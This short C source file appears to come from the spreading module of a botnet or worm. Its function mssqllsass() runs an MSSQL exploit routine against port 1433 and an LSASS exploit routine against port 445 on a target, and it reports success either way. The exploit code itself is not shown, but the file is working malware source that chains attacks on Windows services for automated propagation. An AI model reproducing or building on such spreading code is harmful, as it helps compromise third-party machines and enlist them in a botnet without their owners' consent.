#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

#ifndef NO_MSSQL
#ifndef NO_LSASS
#ifndef NO_MSSQLLSASS
BOOL mssqllsass(EXINFO exinfo)
{
	exinfo.port = 1433;
	BOOL bMSSQL = MSSQL(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);

	return bMSSQL || bLSASS ? TRUE : TRUE;
}
#endif
#endif
#endif